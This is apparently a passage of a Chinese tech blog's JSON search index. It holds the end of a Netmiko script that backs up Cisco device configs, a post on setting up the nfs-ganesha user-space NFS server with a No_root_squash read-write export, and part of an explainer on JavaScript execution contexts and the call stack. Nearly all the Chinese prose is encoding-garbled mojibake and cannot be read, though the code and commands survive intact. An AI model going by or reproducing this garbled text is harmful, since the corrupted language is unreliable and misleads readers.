class=\"n\"\u003ename\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003edev\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;ip\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003econnection\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003eNetmiko\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e**\u003c/span\u003e\u003cspan class=\"n\"\u003edev\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003econnection\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eenable\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003eout\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003econnection\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esend_command\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;show running-config\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003ecalender\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003estrftime\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;%Y%m\u003c/span\u003e\u003cspan class=\"si\"\u003e%d\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003efile_name\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"si\"\u003e{}\u003c/span\u003e\u003cspan class=\"s1\"\u003e-\u003c/span\u003e\u003cspan class=\"si\"\u003e{}\u003c/span\u003e\u003cspan class=\"s1\"\u003e.txt\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eformat\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003edev\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\u003cspan class=\"n\"\u003ecalender\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003efile\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efile_name\u003c/span\u003e \u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;w\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003efile\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eout\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003efile\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"n\"\u003econnection\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edisconnect\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nb\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;BACKUP for \u003c/span\u003e\u003cspan class=\"si\"\u003e%s\u003c/span\u003e\u003cspan class=\"s2\"\u003e done\u0026#34;\u003c/span\u003e \u003cspan class=\"o\"\u003e%\u003c/span\u003e\u003cspan class=\"n\"\u003edev\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;host\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","title":"Ciscoè®¾å¤‡è‡ªåŠ¨æ‰§è¡Œå’Œå¤‡ä»½çš„è„šæœ¬"},{"content":"NFS Server å¾ˆå¸¸ç”¨ï¼Œä½†æ˜¯å‘ä¹Ÿæ˜¯å·¨å¤§çš„ã€‚ä¹‹å‰åœ¨äº¬ä¸œè¿ç»´ Hadoop é›†ç¾¤çš„æ—¶å€™ç¢°åˆ°è¿‡è„‘è£‚ï¼ŒåŸå› å°±æ˜¯ NFS å¼•èµ·çš„ã€‚\nå…³é”® NFS æ˜¯å†…æ ¸æ€çš„ï¼Œä¸€æ—¦å´©æºƒï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯çš„æ‰€æœ‰å‘½ä»¤ï¼Œlsã€dfã€duç­‰ç­‰ï¼Œç»Ÿç»Ÿæ— ååº”ï¼Œç»“æœæ˜¯å¾ˆæ‚²å‰§çš„ã€‚\nä¸‹é¢è¦æ¨èä¸€ä¸‹ nfs-ganesha ï¼Œå®ƒæ˜¯ç”¨æˆ·æ€çš„nfs-serverï¼Œæ”¯æŒv3å’Œv4ï¼Œè€Œnfsç¼ºçœæ˜¯å†…æ ¸æ€çš„v3ã€‚\nå¼ºçƒˆæ¨èå¤§å®¶ç”¨è¿™ä¸ªï¼Œè€Œä¸æ˜¯ç”¨å†…æ ¸æ€çš„ï¼Œå¹¶ä¸” nfs-ganesha è¿˜æ˜¯æ”¯æŒ glusterFS çš„ã€‚\nyum install -y centos-release-nfs-ganesha30.noarch vi /etc/ganesha/ganesha.conf %include /etc/ganesha/exports/gv0.conf vi /etc/ganesha/exports/gv0.conf EXPORT{ Export_Id = 1 ; # Export ID unique to each export Path = \u0026#34;/mnt/upload\u0026#34;; Pseudo = /upload; FSAL { name = VFS; } Access_type = RW; # Access permissions Squash = No_root_squash; # To enable/disable root squashing Disable_ACL = TRUE; # To enable/disable ACL Protocols = \u0026#34;4\u0026#34; ; # NFS protocols supported Transports = \u0026#34;UDP\u0026#34;,\u0026#34;TCP\u0026#34; ; # Transport protocols supported SecType = \u0026#34;sys\u0026#34;; # Security flavors supported } #å¯åŠ¨ systemctl restart nfs-ganesha #æ‰‹åŠ¨mountçš„æ–¹æ³• mount -t nfs -o soft,intr,rsize=8192,wsize=8192,timeo=900,proto=tcp,vers=4 192.168.31.2:/upload /mnt/nfs-upload #è‡ªåŠ¨mountçš„æ–¹æ³• cat /etc/fstab 192.168.31.2:/upload /mnt/nfs-upload nfs rw,vers=4,addr=192.168.31.2,clientaddr=192.168.31.8 0 0 æ³¨æ„idå¯¹é½é—®é¢˜å¯èƒ½è¦ç”¨åˆ°rpcidmapd\n","permalink":"https://rendoumi.com/posts/20220706-nfs_usermode/","summary":"\u003cp\u003eNFS Server å¾ˆå¸¸ç”¨ï¼Œä½†æ˜¯å‘ä¹Ÿæ˜¯å·¨å¤§çš„ã€‚ä¹‹å‰åœ¨äº¬ä¸œè¿ç»´ Hadoop é›†ç¾¤çš„æ—¶å€™ç¢°åˆ°è¿‡è„‘è£‚ï¼ŒåŸå› å°±æ˜¯ NFS å¼•èµ·çš„ã€‚\u003c/p\u003e\n\u003cp\u003eå…³é”® NFS æ˜¯å†…æ ¸æ€çš„ï¼Œä¸€æ—¦å´©æºƒï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯çš„æ‰€æœ‰å‘½ä»¤ï¼Œlsã€dfã€duç­‰ç­‰ï¼Œç»Ÿç»Ÿæ— ååº”ï¼Œç»“æœæ˜¯å¾ˆæ‚²å‰§çš„ã€‚\u003c/p\u003e\n\u003cp\u003eä¸‹é¢è¦æ¨èä¸€ä¸‹ nfs-ganesha ï¼Œå®ƒæ˜¯ç”¨æˆ·æ€çš„nfs-serverï¼Œæ”¯æŒv3å’Œv4ï¼Œè€Œnfsç¼ºçœæ˜¯å†…æ ¸æ€çš„v3ã€‚\u003c/p\u003e\n\u003cp\u003eå¼ºçƒˆæ¨èå¤§å®¶ç”¨è¿™ä¸ªï¼Œè€Œä¸æ˜¯ç”¨å†…æ ¸æ€çš„ï¼Œå¹¶ä¸” nfs-ganesha è¿˜æ˜¯æ”¯æŒ glusterFS çš„ã€‚\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum install -y centos-release-nfs-ganesha30.noarch\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/ganesha/ganesha.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e%include /etc/ganesha/exports/gv0.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/ganesha/exports/gv0.conf\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eEXPORT\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eExport_Id\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"p\"\u003e;\u003c/span\u003e   \u003cspan class=\"c1\"\u003e# Export ID unique to each export\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003ePath\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;/mnt/upload\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003ePseudo\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e /upload\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    FSAL \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"nv\"\u003ename\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e VFS\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eAccess_type\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e RW\u003cspan class=\"p\"\u003e;\u003c/span\u003e    \u003cspan class=\"c1\"\u003e# Access permissions\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eSquash\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e No_root_squash\u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"c1\"\u003e# To enable/disable root squashing\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eDisable_ACL\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e TRUE\u003cspan class=\"p\"\u003e;\u003c/span\u003e  \u003cspan class=\"c1\"\u003e# To enable/disable ACL\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eProtocols\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;4\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e;\u003c/span\u003e    \u003cspan class=\"c1\"\u003e# NFS protocols supported\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eTransports\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;UDP\u0026#34;\u003c/span\u003e,\u003cspan class=\"s2\"\u003e\u0026#34;TCP\u0026#34;\u003c/span\u003e \u003cspan class=\"p\"\u003e;\u003c/span\u003e \u003cspan class=\"c1\"\u003e# Transport protocols supported\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"nv\"\u003eSecType\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026#34;sys\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e     \u003cspan class=\"c1\"\u003e# Security flavors supported\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#å¯åŠ¨\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esystemctl restart nfs-ganesha\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#æ‰‹åŠ¨mountçš„æ–¹æ³•\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emount -t nfs -o soft,intr,rsize\u003cspan class=\"o\"\u003e=\u003c/span\u003e8192,wsize\u003cspan class=\"o\"\u003e=\u003c/span\u003e8192,timeo\u003cspan class=\"o\"\u003e=\u003c/span\u003e900,proto\u003cspan class=\"o\"\u003e=\u003c/span\u003etcp,vers\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e4\u003c/span\u003e 192.168.31.2:/upload /mnt/nfs-upload\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#è‡ªåŠ¨mountçš„æ–¹æ³•\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat /etc/fstab\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e192.168.31.2:/upload /mnt/nfs-upload nfs rw,vers\u003cspan class=\"o\"\u003e=\u003c/span\u003e4,addr\u003cspan class=\"o\"\u003e=\u003c/span\u003e192.168.31.2,clientaddr\u003cspan class=\"o\"\u003e=\u003c/span\u003e192.168.31.8 \u003cspan class=\"m\"\u003e0\u003c/span\u003e \u003cspan class=\"m\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„idå¯¹é½é—®é¢˜å¯èƒ½è¦ç”¨åˆ°rpcidmapd\u003c/p\u003e","title":"ç”¨æˆ·æ€çš„NFS Server"},{"content":"JavaScript åˆ°åº•æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼Ÿ ä¸€ã€å·¥ä½œåŸç† JavaScriptåˆ°åº•æ˜¯ï¼š\nåŒæ­¥è¿˜æ˜¯å¼‚æ­¥ï¼Ÿ å•çº¿ç¨‹è¿˜æ˜¯å¤šçº¿ç¨‹ï¼Ÿ JavaScript ä¸­çš„ä¸€åˆ‡éƒ½å‘ç”Ÿåœ¨\nExecution Context ï¼ˆæ‰§è¡Œä¸Šä¸‹æ–‡ï¼‰ä¸­\næ‚¨å¯ä»¥å‡è®¾è¿™ä¸ªæ‰§è¡Œä¸Šä¸‹æ–‡ æ˜¯ä¸€ä¸ªå¤§ç›’å­æˆ–ä¸€ä¸ªå®¹å™¨ï¼Œåœ¨å…¶ä¸­æ‰§è¡Œæ•´ä¸ª JavaScript ä»£ç ã€‚ è¿™ä¸ªå¤§ç›’å­é‡Œæœ‰ä¸¤ä¸ªç»„ä»¶ï¼š Memoryï¼ˆå†…å­˜ç»„ä»¶ï¼‰ï¼šè¿™æ˜¯æ‰€æœ‰å˜é‡å’Œå‡½æ•°å­˜å‚¨ä¸ºé”®å€¼å¯¹çš„åœ°æ–¹ã€‚è¿™ä¸ª**â€œå†…å­˜ç»„ä»¶â€ä¹Ÿç§°ä¸ºå˜é‡ç¯å¢ƒ**ã€‚å› æ­¤ï¼Œå®ƒæ˜¯ä¸€ç§ç¯å¢ƒï¼Œå…¶ä¸­æ‰€æœ‰è¿™äº›å˜é‡å’Œå‡½æ•°éƒ½å­˜å‚¨ä¸ºé”®å€¼å¯¹ã€‚ Codeï¼ˆä»£ç ç»„ä»¶ï¼‰ï¼šè¿™æ˜¯ä»£ç é€è¡Œæ‰§è¡Œçš„åœ°æ–¹ã€‚è¿™ä¸ªâ€œä»£ç ç»„ä»¶â€ä¹Ÿç§°ä¸ºæ‰§è¡Œçº¿ç¨‹ã€‚æ‰€ä»¥ï¼Œè¿™ä¸ªæ‰§è¡Œçº¿ç¨‹æ˜¯ä¸€ä¸ªå•çº¿ç¨‹ï¼Œæ•´ä¸ªä»£ç ä¸€æ¬¡åªæ‰§è¡Œä¸€è¡Œã€‚ ç»“è®ºï¼šJavaScript æ˜¯ä¸€ç§åŒæ­¥å•çº¿ç¨‹è¯­è¨€ã€‚\nå•çº¿ç¨‹ æ„å‘³ç€ JavaScript ä¸€æ¬¡åªèƒ½æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ã€‚ åŒæ­¥å•çº¿ç¨‹ æ„å‘³ç€ JavaScript ä¸€æ¬¡åªèƒ½ä»¥ç‰¹å®šé¡ºåºæ¯æ¬¡æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ã€‚è¿™æ„å‘³ç€å®ƒåªèƒ½åœ¨å½“å‰è¡Œå®Œæˆæ‰§è¡Œåè½¬åˆ°ä¸‹ä¸€è¡Œã€‚è¿™å°±æ˜¯åŒæ­¥å•çº¿ç¨‹çš„æ„æ€ã€‚ å¾ˆæƒŠè¯§å§ï¼Œå®é™… javascripts æœ‰å•çº¿ç¨‹ event loop å¤§å¾ªç¯æ¥å®Œæˆå¾ˆå¤šä¸å¯æ€è®®çš„äº‹æƒ…ã€‚\näºŒã€å®é™…å·¥ä½œè¿‡ç¨‹åˆ†æ JavaScript ä»£ç æ˜¯å¦‚ä½•æ‰§è¡Œçš„ï¼Ÿ å½“ä½ è¿è¡Œ JavaScript ä»£ç æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ\nä¼šåˆ›å»ºä¸€ä¸ªExecution Contextï¼ˆæ‰§è¡Œä¸Šä¸‹æ–‡ï¼‰ã€‚\nè®©æˆ‘ä»¬ä½¿ç”¨å®é™…çš„ä»£ç æ¥ä¸¾ä¸ªä¾‹å­ï¼š\nvar n = 2; function square(num) { var ans = num * num; return ans; } var square2 = square(n); var square4 = square(4); æ‰§è¡Œä¸Šè¿°ä»£ç æ—¶ï¼Œä¼šåˆ›å»º ä¸€ä¸ªæ‰§è¡Œä¸Šä¸‹æ–‡\næ­¤æ‰§è¡Œä¸Šä¸‹æ–‡åˆ†ä¸¤ä¸ªé˜¶æ®µåˆ›å»ºï¼š\nä¸€ã€åˆ›å»ºï¼š\nåˆ›å»ºé˜¶æ®µä¹Ÿç§°ä¸ºå†…å­˜åˆ›å»ºé˜¶æ®µ\nã€‚è¿™æ˜¯ä¸€ä¸ªéå¸¸å…³é”®çš„é˜¶æ®µã€‚\nåœ¨å†…å­˜åˆ›å»ºçš„ç¬¬ä¸€é˜¶æ®µï¼ŒJavaScript ä¼šä¸ºæ‰€æœ‰çš„å˜é‡å’Œå‡½æ•°åˆ†é…å†…å­˜ã€‚\né¦–å…ˆ JavaScript é‡åˆ°var n = 2;ï¼Œå®ƒå°±ä¼šåˆ†é…å†…å­˜ç»™n.\nå½“ä¸ºnåˆ†é…å†…å­˜æ—¶ï¼Œå®ƒä¼šå…ˆå­˜å‚¨ä¸€ä¸ªç‰¹æ®Šå€¼undefinedã€‚undefinedåœ¨ JavaScript ä¸­è¢«è§†ä¸ºç‰¹æ®Šçš„å ä½ç¬¦ã€‚\nåœ¨é‡åˆ° functionsquare(num)æ—¶ï¼Œå®ƒä¹Ÿä¼šä¸ºè¿™ä¸ª function () åˆ†é…å†…å­˜ã€‚\nåœ¨ä¸º function() åˆ†é…å†…å­˜çš„æƒ…å†µä¸‹ï¼Œå®ƒå°†è¯¥å‡½æ•°çš„æ•´ä¸ªä»£ç å­˜å‚¨åœ¨å†…å­˜ç©ºé—´ä¸­ã€‚\nåé¢ä¸ºä¸¤ä¸ªå˜é‡square2å’Œsquare4åˆ†é…äº†å†…å­˜ï¼Œå­˜å‚¨çš„åŒæ ·æ˜¯undefinedã€‚\nä¸ºäº†å®Œæˆè¿™ä¸ªåˆ›å»ºé˜¶æ®µï¼ŒJavaScript ä¼šé€è¡Œä»ä¸Šåˆ°ä¸‹éå†æ‰«æä»£ç ã€‚\näºŒã€ä»£ç æ‰§è¡Œï¼š\næ‰«æå®Œæ¯•ï¼Œç°åœ¨ JavaScript å†æ¬¡é€è¡Œè¿è¡Œæ•´ä¸ªç¨‹åºã€‚ å½“å®ƒé‡åˆ°æ—¶var n = 2;ï¼Œå®ƒå®é™…ä¸Šå°†2ä½œä¸ºå€¼næ”¾å…¥å†…å­˜ç»„ä»¶ä¸­ã€‚ å½“å®ƒé‡åˆ° çš„å‡½æ•°å®šä¹‰æ—¶square(num)ï¼Œå®ƒæ²¡æœ‰ä»€ä¹ˆå¯æ‰§è¡Œçš„ï¼Œæ‰€ä»¥ JavaScript ç®€å•åœ°è·³è¿‡äº†ã€‚ å½“å®ƒé‡åˆ° æ—¶var square2 = square(n);ï¼Œæˆ‘ä»¬ç°åœ¨æ­£åœ¨è°ƒç”¨ä¸€ä¸ªå‡½æ•°ã€‚ å‡½æ•°æ˜¯ JavaScript çš„æ ¸å¿ƒã€‚å®ƒä»¬åœ¨ JavaScript ä¸­çš„è¡Œä¸ºä¸åœ¨ä»»ä½•å…¶ä»–è¯­è¨€ä¸­çš„è¡Œä¸ºéå¸¸ä¸åŒã€‚ æ¯å½“è°ƒç”¨ä¸€ä¸ªå‡½æ•°æ—¶ï¼Œéƒ½ä¼šåˆ›å»ºä¸€ä¸ªå…¨æ–°çš„Execution Contextï¼ˆæ‰§è¡Œä¸Šä¸‹æ–‡ï¼‰ã€‚ å› æ­¤ï¼Œä»æŠ€æœ¯ä¸Šè®²ï¼Œåœ¨æ•´ä¸ª**Execution Context çš„ä»£ç ç»„ä»¶ä¸­åˆåˆ›å»ºäº†ä¸€ä¸ªå…¨æ–°çš„Execution Context ** ã€‚ è¿™ä¸ªæ–°çš„å†…éƒ¨ Exection Context æ‰§è¡Œä¸Šä¸‹æ–‡ä¹Ÿæœ‰å®ƒè‡ªå·±çš„å†…å­˜ç»„ä»¶å’Œä»£ç ç»„ä»¶ã€‚ ç°åœ¨åœ¨å†…éƒ¨å‘ç”Ÿçš„äº‹æƒ…æ˜¯ï¼š åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæœ‰ 2 ä¸ªå˜é‡ï¼Œå³numï¼ˆå‚æ•°ï¼‰å’Œansã€‚ æ‰€ä»¥å†…å­˜å°†åˆ†é…ç»™numå’Œansã€‚ åœ¨ç¬¬ 1 é˜¶æ®µï¼Œä¸å¤–éƒ¨æ‰§è¡Œä¸Šä¸‹æ–‡ä¸€æ ·ï¼Œundefinedå°†åˆ†é…ç»™numå’Œansã€‚ ç°åœ¨è¿›å…¥é˜¶æ®µ 2ï¼ˆä»£ç æ‰§è¡Œé˜¶æ®µï¼‰ï¼Œå‚æ•°çš„å€¼è¢«åˆ†é…ç»™å‚æ•°ã€‚å› æ­¤ï¼Œåœ¨æˆ‘ä»¬è°ƒç”¨å‡½æ•°çš„è¯­å¥var square2 = square(n);æ—¶ï¼Œæˆ‘ä»¬å°†å‚æ•°nçš„å€¼ 2 ä¼ é€’ç»™å‡½æ•°square(num)ï¼Œå¹¶ä¸”è¯¥å‚æ•°çš„å€¼æ›¿æ¢äº†å†…éƒ¨æ‰§è¡Œä¸Šä¸‹æ–‡ä¸­numçš„å†…å­˜ç»„ä»¶ä¸­çš„å ä½ç¬¦undefinedã€‚ è®¡ç®—ånum * numï¼Œå°†å€¼å­˜å‚¨åœ¨ ä¸­ansã€‚ åœ¨é‡åˆ° æ—¶return ans;ï¼Œå°†å­˜å‚¨çš„å€¼ansè¿”å›åˆ°è°ƒç”¨çš„ä½ç½®ï¼Œå¹¶ä¸”æ­¤å†…éƒ¨æ‰§è¡Œä¸Šä¸‹æ–‡ç»“æŸã€‚å½“å®ƒç»“æŸæ—¶ï¼Œå†…éƒ¨æ‰§è¡Œä¸Šä¸‹æ–‡å®é™…ä¸Šè¢«åˆ é™¤äº†ã€‚ ç°åœ¨ï¼Œé‡åˆ°ä¸‹ä¸€è¡Œæ—¶éµå¾ªç›¸åŒçš„è¿‡ç¨‹var square4 = square(4);ã€‚ æœ€åä¸€è¡ŒæˆåŠŸæ‰§è¡Œåï¼Œæ•´ä¸ªæ‰§è¡Œä¸Šä¸‹æ–‡ä¹Ÿè¢«åˆ é™¤ã€‚è¿™ç§*â€œæ•´ä½“â€*æ‰§è¡Œä¸Šä¸‹æ–‡ä¹Ÿç§°ä¸ºå…¨å±€æ‰§è¡Œä¸Šä¸‹æ–‡ã€‚ é‚£ä¹ˆï¼ŒJavaScript æ˜¯å¦‚ä½•ç®¡ç†è¿™ç§é“¾æ¡å¼çš„ ** æ‰§è¡Œä¸Šä¸‹æ–‡ ** çš„å‘¢ï¼Ÿ\nå®ƒå®é™…ä¸Šåœ¨åå°ç®¡ç†ä¸€ä¸ªå †æ ˆã€‚ æ­¤å †æ ˆä¹Ÿç§°ä¸ºCall Stackï¼ˆè°ƒç”¨å †æ ˆï¼‰ã€‚ GECï¼ˆGlobal Execution Context å…¨å±€æ‰§è¡Œä¸Šä¸‹æ–‡ï¼‰å§‹ç»ˆä½äºæ­¤å †æ ˆçš„åº•éƒ¨ã€‚ 